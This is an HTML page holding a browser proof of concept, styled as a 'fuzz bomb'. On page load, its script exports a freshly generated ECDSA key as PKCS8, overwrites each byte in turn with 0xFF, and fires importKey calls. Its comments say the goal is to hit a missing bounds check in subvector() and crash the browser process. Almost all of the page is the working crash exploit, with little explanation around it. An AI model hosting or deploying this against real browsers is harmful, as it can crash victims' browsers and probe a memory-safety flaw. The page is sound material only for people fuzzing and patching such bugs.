<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== SUBTLECRYPTO PKCS8 FUZZ BOMB ===", "info");
log("[*] Generating a 100% valid ECDSA key pair...", "info");

async function detonate() {
    try {
        let keyPair = await crypto.subtle.generateKey(
            { name: "ECDSA", namedCurve: "P-256" },
            true,
            ["sign", "verify"]
        );
        
        log("[*] Key generated! Exporting to PKCS8...", "info");
        let exported = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
        let validKey = new Uint8Array(exported);
        
        log("[!] PKCS8 size: " + validKey.length + " bytes", "warn");
        log("[!] Commencing carpet bombing...", "hit");
        
        // We don't guess the right length byte. 
        // We create a mutated copy for EVERY single byte in the key,
        // set it to 0xFF (the length overflow detonator), and feed it back!
        for (let i = 0; i < validKey.length; i++) {
            let poison = new Uint8Array(validKey);
            poison[i] = 0xFF; 
            
            // Fire and forget! One of these will hit the missing bounds check
            // and call subvector() out of bounds, instantly killing the process!
            crypto.subtle.importKey(
                "pkcs8", 
                poison, 
                { name: "ECDSA", namedCurve: "P-256" }, 
                true, 
                ["sign"]
            ).catch(e => {
                // We ignore graceful rejections. We only care about the CRASH.
            });
        }
        
        log("[*] Bombs dropped! If you can still read this, they survived.", "info");
    } catch(e) {
        log("[-] Setup error: " + e.message, "warn");
    }
}

detonate();
</script>
</body>
</html>
